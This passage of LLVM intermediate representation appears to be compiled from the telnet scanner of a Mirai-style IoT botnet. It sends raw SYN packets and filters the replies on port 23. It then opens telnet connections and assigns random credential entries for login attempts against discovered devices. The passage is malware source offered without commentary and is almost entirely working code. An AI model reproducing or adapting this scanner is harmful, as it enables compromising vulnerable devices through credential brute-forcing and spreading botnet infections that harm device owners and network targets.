  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  %186 = load i32, i32* %185, align 4
  %187 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 2
  store i32 %186, i32* %188, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 6
  store i16 0, i16* %190, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %192 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %193 = bitcast %struct.tcphdr* %192 to i8*
  %194 = call zeroext i16 @htons(i16 zeroext 20) #11
  %195 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %191, i8* %193, i16 zeroext %194, i32 20)
  %196 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 6
  store i16 %195, i16* %197, align 4
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %198, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  %201 = load i32, i32* %200, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 1
  %206 = load i16, i16* %205, align 2
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %206, i16* %207, align 2
  %208 = load i32, i32* @rsck, align 4
  %209 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %210 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %210, %struct.sockaddr** %209, align 8
  %211 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %212 = load %struct.sockaddr*, %struct.sockaddr** %211, align 8
  %213 = call i64 @sendto(i32 %208, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* %212, i32 16)
  br label %214

214:                                              ; preds = %159
  %215 = load i32, i32* %1, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %1, align 4
  br label %156, !llvm.loop !10

217:                                              ; preds = %156
  br label %218

218:                                              ; preds = %217, %150
  store i32 0, i32* %12, align 4
  br label %219

219:                                              ; preds = %218, %248, %255, %262, %271, %280, %288, %296, %304, %312, %324, %352
  %220 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i64 0, i64 0
  %221 = bitcast i8* %220 to %struct.iphdr*
  store %struct.iphdr* %221, %struct.iphdr** %23, align 8
  %222 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i64 1
  %224 = bitcast %struct.iphdr* %223 to %struct.tcphdr*
  store %struct.tcphdr* %224, %struct.tcphdr** %24, align 8
  %225 = call i32* @__errno_location() #11
  store i32 0, i32* %225, align 4
  %226 = load i32, i32* @rsck, align 4
  %227 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i64 0, i64 0
  %228 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %228, align 8
  %229 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %230 = load %struct.sockaddr*, %struct.sockaddr** %229, align 8
  %231 = call i64 @recvfrom(i32 %226, i8* %227, i64 1514, i32 16384, %struct.sockaddr* %230, i32* null)
  %232 = trunc i64 %231 to i32
  store i32 %232, i32* %21, align 4
  %233 = load i32, i32* %21, align 4
  %234 = icmp sle i32 %233, 0
  br i1 %234, label %243, label %235

235:                                              ; preds = %219
  %236 = call i32* @__errno_location() #11
  %237 = load i32, i32* %236, align 4
  %238 = icmp eq i32 %237, 11
  br i1 %238, label %243, label %239

239:                                              ; preds = %235
  %240 = call i32* @__errno_location() #11
  %241 = load i32, i32* %240, align 4
  %242 = icmp eq i32 %241, 11
  br i1 %242, label %243, label %244

243:                                              ; preds = %239, %235, %219
  br label %364

244:                                              ; preds = %239
  %245 = load i32, i32* %21, align 4
  %246 = sext i32 %245 to i64
  %247 = icmp ult i64 %246, 40
  br i1 %247, label %248, label %249

248:                                              ; preds = %244
  br label %219

249:                                              ; preds = %244
  %250 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 9
  %252 = load i32, i32* %251, align 4
  %253 = load i32, i32* @LOCAL_ADDR, align 4
  %254 = icmp ne i32 %252, %253
  br i1 %254, label %255, label %256

255:                                              ; preds = %249
  br label %219

256:                                              ; preds = %249
  %257 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 6
  br i1 %261, label %262, label %263

262:                                              ; preds = %256
  br label %219

263:                                              ; preds = %256
  %264 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = load i16, i16* %265, align 4
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @htons(i16 zeroext 23) #11
  %269 = zext i16 %268 to i32
  %270 = icmp ne i32 %267, %269
  br i1 %270, label %271, label %272

271:                                              ; preds = %263
  br label %219

272:                                              ; preds = %263
  %273 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 1
  %275 = load i16, i16* %274, align 2
  %276 = zext i16 %275 to i32
  %277 = load i16, i16* %2, align 2
  %278 = zext i16 %277 to i32
  %279 = icmp ne i32 %276, %278
  br i1 %279, label %280, label %281

280:                                              ; preds = %272
  br label %219

281:                                              ; preds = %272
  %282 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 4
  %284 = load i16, i16* %283, align 4
  %285 = lshr i16 %284, 9
  %286 = and i16 %285, 1
  %287 = icmp ne i16 %286, 0
  br i1 %287, label %289, label %288

288:                                              ; preds = %281
  br label %219

289:                                              ; preds = %281
  %290 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 4
  %292 = load i16, i16* %291, align 4
  %293 = lshr i16 %292, 12
  %294 = and i16 %293, 1
  %295 = icmp ne i16 %294, 0
  br i1 %295, label %297, label %296

296:                                              ; preds = %289
  br label %219

297:                                              ; preds = %289
  %298 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 4
  %300 = load i16, i16* %299, align 4
  %301 = lshr i16 %300, 10
  %302 = and i16 %301, 1
  %303 = icmp ne i16 %302, 0
  br i1 %303, label %304, label %305

304:                                              ; preds = %297
  br label %219

305:                                              ; preds = %297
  %306 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 4
  %308 = load i16, i16* %307, align 4
  %309 = lshr i16 %308, 8
  %310 = and i16 %309, 1
  %311 = icmp ne i16 %310, 0
  br i1 %311, label %312, label %313

312:                                              ; preds = %305
  br label %219

313:                                              ; preds = %305
  %314 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 3
  %316 = load i32, i32* %315, align 4
  %317 = call i32 @ntohl(i32 %316) #11
  %318 = sub i32 %317, 1
  %319 = call i32 @htonl(i32 %318) #11
  %320 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 8
  %322 = load i32, i32* %321, align 4
  %323 = icmp ne i32 %319, %322
  br i1 %323, label %324, label %325

324:                                              ; preds = %313
  br label %219

325:                                              ; preds = %313
  store %struct.scanner_connection* null, %struct.scanner_connection** %25, align 8
  %326 = load i32, i32* %12, align 4
  store i32 %326, i32* %21, align 4
  br label %327

327:                                              ; preds = %345, %325
  %328 = load i32, i32* %21, align 4
  %329 = icmp slt i32 %328, 628
  br i1 %329, label %330, label %348

330:                                              ; preds = %327
  %331 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %332 = load i32, i32* %21, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %331, i64 %333
  %335 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %334, i32 0, i32 16
  %336 = load i32, i32* %335, align 8
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %338, label %344

338:                                              ; preds = %330
  %339 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %340 = load i32, i32* %21, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %339, i64 %341
  store %struct.scanner_connection* %342, %struct.scanner_connection** %25, align 8
  %343 = load i32, i32* %21, align 4
  store i32 %343, i32* %12, align 4
  br label %348

344:                                              ; preds = %330
  br label %345

345:                                              ; preds = %344
  %346 = load i32, i32* %21, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %21, align 4
  br label %327, !llvm.loop !11

348:                                              ; preds = %338, %327
  %349 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %350 = icmp eq %struct.scanner_connection* %349, null
  br i1 %350, label %351, label %352

351:                                              ; preds = %348
  br label %364

352:                                              ; preds = %348
  %353 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 8
  %355 = load i32, i32* %354, align 4
  %356 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %357 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %356, i32 0, i32 15
  store i32 %355, i32* %357, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = load i16, i16* %359, align 4
  %361 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %362 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %361, i32 0, i32 13
  store i16 %360, i16* %362, align 8
  %363 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %363)
  br label %219

364:                                              ; preds = %351, %243
  br label %365

365:                                              ; preds = %364
  store %struct.fd_set* %8, %struct.fd_set** %28, align 8
  store i32 0, i32* %27, align 4
  br label %366

366:                                              ; preds = %376, %365
  %367 = load i32, i32* %27, align 4
  %368 = zext i32 %367 to i64
  %369 = icmp ult i64 %368, 16
  br i1 %369, label %370, label %379

370:                                              ; preds = %366
  %371 = load %struct.fd_set*, %struct.fd_set** %28, align 8
  %372 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %371, i32 0, i32 0
  %373 = load i32, i32* %27, align 4
  %374 = zext i32 %373 to i64
  %375 = getelementptr inbounds [16 x i64], [16 x i64]* %372, i64 0, i64 %374
  store i64 0, i64* %375, align 8
  br label %376

376:                                              ; preds = %370
  %377 = load i32, i32* %27, align 4
  %378 = add i32 %377, 1
  store i32 %378, i32* %27, align 4
  br label %366, !llvm.loop !12

379:                                              ; preds = %366
  br label %380

380:                                              ; preds = %379
  br label %381

381:                                              ; preds = %380
  store %struct.fd_set* %9, %struct.fd_set** %30, align 8
  store i32 0, i32* %29, align 4
  br label %382

382:                                              ; preds = %392, %381
  %383 = load i32, i32* %29, align 4
  %384 = zext i32 %383 to i64
  %385 = icmp ult i64 %384, 16
  br i1 %385, label %386, label %395

386:                                              ; preds = %382
  %387 = load %struct.fd_set*, %struct.fd_set** %30, align 8
  %388 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %387, i32 0, i32 0
  %389 = load i32, i32* %29, align 4
  %390 = zext i32 %389 to i64
  %391 = getelementptr inbounds [16 x i64], [16 x i64]* %388, i64 0, i64 %390
  store i64 0, i64* %391, align 8
  br label %392

392:                                              ; preds = %386
  %393 = load i32, i32* %29, align 4
  %394 = add i32 %393, 1
  store i32 %394, i32* %29, align 4
  br label %382, !llvm.loop !13

395:                                              ; preds = %382
  br label %396

396:                                              ; preds = %395
  store i32 0, i32* %1, align 4
  br label %397

397:                                              ; preds = %522, %396
  %398 = load i32, i32* %1, align 4
  %399 = icmp slt i32 %398, 628
  br i1 %399, label %400, label %525

400:                                              ; preds = %397
  %401 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %402 = load i32, i32* %1, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %401, i64 %403
  store %struct.scanner_connection* %404, %struct.scanner_connection** %10, align 8
  %405 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %406 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %405, i32 0, i32 16
  %407 = load i32, i32* %406, align 8
  %408 = icmp ugt i32 %407, 1
  %409 = zext i1 %408 to i64
  %410 = select i1 %408, i32 30, i32 5
  store i32 %410, i32* %31, align 4
  %411 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %412 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %411, i32 0, i32 16
  %413 = load i32, i32* %412, align 8
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %415, label %458

415:                                              ; preds = %400
  %416 = load i32, i32* @fake_time, align 4
  %417 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %418 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %417, i32 0, i32 3
  %419 = load i32, i32* %418, align 4
  %420 = sub i32 %416, %419
  %421 = load i32, i32* %31, align 4
  %422 = icmp ugt i32 %420, %421
  br i1 %422, label %423, label %458

423:                                              ; preds = %415
  %424 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %425 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %424, i32 0, i32 2
  %426 = load i32, i32* %425, align 8
  %427 = icmp eq i32 %426, -1
  br i1 %427, label %428, label %429

428:                                              ; preds = %423
  br label %522

429:                                              ; preds = %423
  %430 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %431 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %430, i32 0, i32 2
  %432 = load i32, i32* %431, align 8
  %433 = call i32 @close(i32 %432)
  %434 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %435 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %434, i32 0, i32 2
  store i32 -1, i32* %435, align 8
  %436 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %437 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %436, i32 0, i32 16
  %438 = load i32, i32* %437, align 8
  %439 = icmp ugt i32 %438, 2
  br i1 %439, label %440, label %452

440:                                              ; preds = %429
  %441 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %442 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %441, i32 0, i32 9
  %443 = load i8, i8* %442, align 4
  %444 = add i8 %443, 1
  store i8 %444, i8* %442, align 4
  %445 = zext i8 %444 to i32
  %446 = icmp eq i32 %445, 10
  br i1 %446, label %447, label %449

447:                                              ; preds = %440
  %448 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %448, i32 1)
  br label %451

449:                                              ; preds = %440
  %450 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %450)
  br label %451

451:                                              ; preds = %449, %447
  br label %457

452:                                              ; preds = %429
  %453 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %454 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %453, i32 0, i32 9
  store i8 0, i8* %454, align 4
  %455 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %456 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %455, i32 0, i32 16
  store i32 0, i32* %456, align 8
  br label %457

457:                                              ; preds = %452, %451
  br label %522

458:                                              ; preds = %415, %400
  %459 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %460 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %459, i32 0, i32 16
  %461 = load i32, i32* %460, align 8
  %462 = icmp eq i32 %461, 1
  br i1 %462, label %463, label %489

463:                                              ; preds = %458
  %464 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %465 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %464, i32 0, i32 2
  %466 = load i32, i32* %465, align 8
  %467 = srem i32 %466, 64
  %468 = zext i32 %467 to i64
  %469 = shl i64 1, %468
  %470 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i32 0, i32 0
  %471 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %472 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %471, i32 0, i32 2
  %473 = load i32, i32* %472, align 8
  %474 = sdiv i32 %473, 64
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds [16 x i64], [16 x i64]* %470, i64 0, i64 %475
  %477 = load i64, i64* %476, align 8
  %478 = or i64 %477, %469
  store i64 %478, i64* %476, align 8
  %479 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %480 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %479, i32 0, i32 2
  %481 = load i32, i32* %480, align 8
  %482 = load i32, i32* %15, align 4
  %483 = icmp sgt i32 %481, %482
  br i1 %483, label %484, label %488

484:                                              ; preds = %463
  %485 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %486 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %485, i32 0, i32 2
  %487 = load i32, i32* %486, align 8
  store i32 %487, i32* %15, align 4
  br label %488

488:                                              ; preds = %484, %463
  br label %521

489:                                              ; preds = %458
  %490 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %491 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %490, i32 0, i32 16
  %492 = load i32, i32* %491, align 8
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %494, label %520

494:                                              ; preds = %489
  %495 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %496 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %495, i32 0, i32 2
  %497 = load i32, i32* %496, align 8
  %498 = srem i32 %497, 64
  %499 = zext i32 %498 to i64
  %500 = shl i64 1, %499
  %501 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %502 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %503 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %502, i32 0, i32 2
  %504 = load i32, i32* %503, align 8
  %505 = sdiv i32 %504, 64
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds [16 x i64], [16 x i64]* %501, i64 0, i64 %506
  %508 = load i64, i64* %507, align 8
  %509 = or i64 %508, %500
  store i64 %509, i64* %507, align 8
  %510 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %510, i32 0, i32 2
  %512 = load i32, i32* %511, align 8
  %513 = load i32, i32* %14, align 4
  %514 = icmp sgt i32 %512, %513
  br i1 %514, label %515, label %519

515:                                              ; preds = %494
  %516 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %517 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %516, i32 0, i32 2
  %518 = load i32, i32* %517, align 8
  store i32 %518, i32* %14, align 4
  br label %519

519:                                              ; preds = %515, %494
  br label %520

520:                                              ; preds = %519, %489
  br label %521

521:                                              ; preds = %520, %488
  br label %522

522:                                              ; preds = %521, %457, %428
  %523 = load i32, i32* %1, align 4
  %524 = add nsw i32 %523, 1
  store i32 %524, i32* %1, align 4
  br label %397, !llvm.loop !14

525:                                              ; preds = %397
  %526 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %526, align 8
  %527 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %527, align 8
  %528 = load i32, i32* %15, align 4
  %529 = load i32, i32* %14, align 4
  %530 = icmp sgt i32 %528, %529
  br i1 %530, label %531, label %533

531:                                              ; preds = %525
  %532 = load i32, i32* %15, align 4
  br label %535

533:                                              ; preds = %525
  %534 = load i32, i32* %14, align 4
  br label %535

535:                                              ; preds = %533, %531
  %536 = phi i32 [ %532, %531 ], [ %534, %533 ]
  %537 = add nsw i32 1, %536
  %538 = call i32 @select(i32 %537, %struct.fd_set* %8, %struct.fd_set* %9, %struct.fd_set* null, %struct.timeval* %11)
  %539 = call i64 @time(i64* null) #9
  %540 = trunc i64 %539 to i32
  store i32 %540, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %541

541:                                              ; preds = %1164, %535
  %542 = load i32, i32* %1, align 4
  %543 = icmp slt i32 %542, 628
  br i1 %543, label %544, label %1167

544:                                              ; preds = %541
  %545 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %546 = load i32, i32* %1, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %545, i64 %547
  store %struct.scanner_connection* %548, %struct.scanner_connection** %10, align 8
  %549 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %550 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %549, i32 0, i32 2
  %551 = load i32, i32* %550, align 8
  %552 = icmp eq i32 %551, -1
  br i1 %552, label %553, label %554

553:                                              ; preds = %544
  br label %1164

554:                                              ; preds = %544
  %555 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i32 0, i32 0
  %556 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %557 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %556, i32 0, i32 2
  %558 = load i32, i32* %557, align 8
  %559 = sdiv i32 %558, 64
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds [16 x i64], [16 x i64]* %555, i64 0, i64 %560
  %562 = load i64, i64* %561, align 8
  %563 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %564 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %563, i32 0, i32 2
  %565 = load i32, i32* %564, align 8
  %566 = srem i32 %565, 64
  %567 = zext i32 %566 to i64
  %568 = shl i64 1, %567
  %569 = and i64 %562, %568
  %570 = icmp ne i64 %569, 0
  br i1 %570, label %571, label %605

571:                                              ; preds = %554
  store i32 0, i32* %32, align 4
  store i32 4, i32* %33, align 4
  %572 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %573 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %572, i32 0, i32 2
  %574 = load i32, i32* %573, align 8
  %575 = bitcast i32* %32 to i8*
  %576 = call i32 @getsockopt(i32 %574, i32 1, i32 4, i8* %575, i32* %33) #9
  %577 = load i32, i32* %32, align 4
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %579, label %590

579:                                              ; preds = %571
  %580 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %581 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %580, i32 0, i32 2
  %582 = load i32, i32* %581, align 8
  %583 = call i32 @close(i32 %582)
  %584 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %585 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %584, i32 0, i32 2
  store i32 -1, i32* %585, align 8
  %586 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %587 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %586, i32 0, i32 9
  store i8 0, i8* %587, align 4
  %588 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %589 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %588, i32 0, i32 16
  store i32 0, i32* %589, align 8
  br label %1164

590:                                              ; preds = %571
  %591 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %592 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %591, i32 0, i32 16
  store i32 2, i32* %592, align 8
  %593 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %594 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %593, i32 0, i32 1
  %595 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %594, i32 0, i32 0
  %596 = load i32, i32* %595, align 8
  %597 = icmp ne i32 %596, 0
  br i1 %597, label %602, label %598

598:                                              ; preds = %590
  %599 = call %struct.scanner_auth* @random_auth_entry()
  %600 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %601 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %600, i32 0, i32 0
  store %struct.scanner_auth* %599, %struct.scanner_auth** %601, align 8
  br label %602

602:                                              ; preds = %598, %590
  %603 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %604 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %603, i32 0, i32 4
  store i32 0, i32* %604, align 8
  br label %605

605:                                              ; preds = %602, %554
  %606 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %607 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %608 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %607, i32 0, i32 2
  %609 = load i32, i32* %608, align 8
  %610 = sdiv i32 %609, 64
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds [16 x i64], [16 x i64]* %606, i64 0, i64 %611
  %613 = load i64, i64* %612, align 8
  %614 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %615 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %614, i32 0, i32 2
  %616 = load i32, i32* %615, align 8
  %617 = srem i32 %616, 64
  %618 = zext i32 %617 to i64
  %619 = shl i64 1, %618
  %620 = and i64 %613, %619
  %621 = icmp ne i64 %620, 0
  br i1 %621, label %622, label %1163

622:                                              ; preds = %605
  br label %623

623:                                              ; preds = %622, %1161
  %624 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %625 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %624, i32 0, i32 16
  %626 = load i32, i32* %625, align 8
  %627 = icmp eq i32 %626, 0
  br i1 %627, label %628, label %629

628:                                              ; preds = %623
  br label %1162

629:                                              ; preds = %623
  %630 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %631 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %630, i32 0, i32 4
  %632 = load i32, i32* %631, align 8
  %633 = icmp sgt i32 %632, 7168
  br i1 %633, label %634, label %646

634:                                              ; preds = %629
  %635 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %636 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %635, i32 0, i32 7
  %637 = getelementptr inbounds [8192 x i8], [8192 x i8]* %636, i64 0, i64 0
  %638 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %639 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %638, i32 0, i32 7
  %640 = getelementptr inbounds [8192 x i8], [8192 x i8]* %639, i64 0, i64 0
  %641 = getelementptr inbounds i8, i8* %640, i64 6144
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %637, i8* align 1 %641, i64 2048, i1 false)
  %642 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %643 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %642, i32 0, i32 4
  %644 = load i32, i32* %643, align 8
  %645 = sub nsw i32 %644, 6144
  store i32 %645, i32* %643, align 8
  br label %646

646:                                              ; preds = %634, %629
  %647 = call i32* @__errno_location() #11
  store i32 0, i32* %647, align 4
  %648 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %648, i32 0, i32 2
  %650 = load i32, i32* %649, align 8
  %651 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %652 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %651, i32 0, i32 7
  %653 = getelementptr inbounds [8192 x i8], [8192 x i8]* %652, i64 0, i64 0
  %654 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %655 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %654, i32 0, i32 4
  %656 = load i32, i32* %655, align 8
  %657 = sext i32 %656 to i64
